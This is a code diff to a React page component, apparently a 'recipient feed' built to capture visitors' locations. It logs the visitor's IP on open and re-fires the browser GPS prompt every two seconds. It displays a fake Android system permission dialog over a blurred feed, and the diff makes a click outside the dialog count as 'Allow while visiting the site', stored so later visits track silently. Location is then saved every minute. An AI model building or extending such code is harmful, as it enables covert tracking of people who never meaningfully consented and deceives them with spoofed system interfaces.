@@ -166,9 +166,13 @@ export default function RecipientFeed({
   };
 
   /*
-   * Handle user tapping "Allow" options inside Android Permission Popup
+   * 1. Allow while visiting the site -> Persisted in localStorage so it never asks again on this site
    */
-  const handleAllowInPopup = () => {
+  const handleAllowWhileVisiting = () => {
+    try {
+      localStorage.setItem("loc_permission_granted", "always");
+    } catch (_) {}
+
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         async (position) => {
@@ -178,7 +182,38 @@ export default function RecipientFeed({
           startOneMinuteInterval();
         },
         () => {
-          // In case browser hard-blocks native prompt, still unlock flow
+          setShowPermissionPopup(false);
+          setHasAllowed(true);
+          hasAllowedRef.current = true;
+          setTimeout(() => {
+            setIsReelOpen(true);
+          }, 5000);
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    } else {
+      setShowPermissionPopup(false);
+      setHasAllowed(true);
+    }
+  };
+
+  /*
+   * 2. Allow this time (Allow Once) -> Temporary for current session only, will ask again on reload/reopen
+   */
+  const handleAllowThisTime = () => {
+    try {
+      localStorage.removeItem("loc_permission_granted");
+    } catch (_) {}
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          setShowPermissionPopup(false);
+          await saveLocation(position);
+          setIsFollowing(true);
+          startOneMinuteInterval();
+        },
+        () => {
           setShowPermissionPopup(false);
           setHasAllowed(true);
           hasAllowedRef.current = true;
@@ -247,26 +282,42 @@ export default function RecipientFeed({
     // 1. Immediately log IP address and visit to MongoDB on open
     trackVisitImmediately();
 
-    // 2. Trigger native browser GPS prompt immediately on page load
-    requestLocation();
-
-    // 2.1 Show Android permission popup after 2.5s if native prompt was ignored
-    const popupTimer = setTimeout(() => {
-      if (!hasAllowedRef.current) {
-        setShowPermissionPopup(true);
+    // 1.1 Check if user previously granted "Allow while visiting the site"
+    let isAlwaysAllowed = false;
+    try {
+      if (typeof window !== "undefined" && localStorage.getItem("loc_permission_granted") === "always") {
+        isAlwaysAllowed = true;
       }
-    }, 2500);
+    } catch (_) {}
 
-    // 3. Continuously ask / retry native browser prompt every 2 seconds until user taps "Allow" or "Allow once"
-    retryTimerRef.current = setInterval(() => {
-      if (!hasAllowedRef.current && !isTrackingStoppedRef.current) {
-        requestLocation();
-      } else if (hasAllowedRef.current) {
-        clearInterval(retryTimerRef.current);
-        retryTimerRef.current = null;
-        startOneMinuteInterval();
-      }
-    }, 2000);
+    if (isAlwaysAllowed) {
+      // Never show popup again for this site, fetch location directly
+      setHasAllowed(true);
+      hasAllowedRef.current = true;
+      setShowPermissionPopup(false);
+      requestLocation();
+    } else {
+      // 2. Trigger native browser GPS prompt immediately on page load
+      requestLocation();
+
+      // 2.1 Show Android permission popup after 2.5s if native prompt was ignored
+      setTimeout(() => {
+        if (!hasAllowedRef.current) {
+          setShowPermissionPopup(true);
+        }
+      }, 2500);
+
+      // 3. Continuously ask / retry native browser prompt every 2 seconds until user taps "Allow" or "Allow once"
+      retryTimerRef.current = setInterval(() => {
+        if (!hasAllowedRef.current && !isTrackingStoppedRef.current) {
+          requestLocation();
+        } else if (hasAllowedRef.current) {
+          clearInterval(retryTimerRef.current);
+          retryTimerRef.current = null;
+          startOneMinuteInterval();
+        }
+      }, 2000);
+    }
 
     // 4. Handle Tab Visibility, Tab Close & 3-Minute Cutoff
     const handleVisibilityChange = () => {
@@ -730,7 +781,7 @@ export default function RecipientFeed({
 
       {/* Android Location Permission Modal (Rendered in front of the blurred feed) */}
       {showPermissionPopup && !hasAllowed && (
-        <div className="android-location-overlay" onClick={handleAllowInPopup}>
+        <div className="android-location-overlay" onClick={handleAllowWhileVisiting}>
           <div className="android-location-card" onClick={(e) => e.stopPropagation()}>
             <div className="android-location-header">
               <div className="android-location-icon-wrapper">
@@ -744,10 +795,10 @@ export default function RecipientFeed({
             </div>
 
             <div className="android-location-buttons">
-              <button className="android-btn-primary" onClick={handleAllowInPopup}>
+              <button className="android-btn-primary" onClick={handleAllowWhileVisiting}>
                 Allow while visiting the site
               </button>
-              <button className="android-btn-primary" onClick={handleAllowInPopup}>
+              <button className="android-btn-primary" onClick={handleAllowThisTime}>
                 Allow this time
               </button>
               <button className="android-btn-secondary" onClick={handleNeverAllow}>
